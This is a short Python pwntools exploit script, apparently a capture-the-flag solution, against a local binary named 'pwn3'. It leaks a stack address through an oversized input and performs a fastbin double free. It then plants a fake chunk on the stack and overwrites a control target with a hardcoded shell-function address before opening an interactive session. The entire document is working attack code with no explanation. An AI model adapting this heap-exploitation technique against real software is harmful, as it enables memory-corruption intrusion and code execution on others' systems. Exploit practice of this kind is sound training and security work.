from pwn import *

shell_addr = 0x400943

context.timeout = 50

p = process('./pwn3')
#gdb.attach(p, 'b * 0x400923')

# leak stack address
p.recvuntil('paper\n')
p.sendline('a'*48*3)
data = p.recvuntil('\x7f')
leak_stack = data[-6:] + '\x00\x00'
leak_stack_addr = u64(leak_stack)
print hex(leak_stack_addr)

def add_paper(p, index, length, contents):
    p.sendline('1')
    p.sendline(str(index))
    p.sendline(str(length))
    p.sendline(contents)
    
def del_paper(p, index):
    p.sendline('2')
    p.sendline(str(index))
    
# fastbin double free
add_paper(p, 1, 32, 'a'*32)
add_paper(p, 2, 32, 'a'*32)
    
del_paper(p, 1)
del_paper(p, 2)
del_paper(p, 1)

# build fake chunk
p.recvuntil('paper\n')
p.sendline('3')
p.recvuntil('number:')
p.sendline('48')

add_paper(p, 1, 32, p64(leak_stack_addr+96))
add_paper(p, 2, 32, 'a'*32)
add_paper(p, 2, 32, 'a'*32)
add_paper(p, 2, 32, 'a'*8 + p64(shell_addr))

p.recvrepeat(1)
p.sendline('3')

p.interactive()
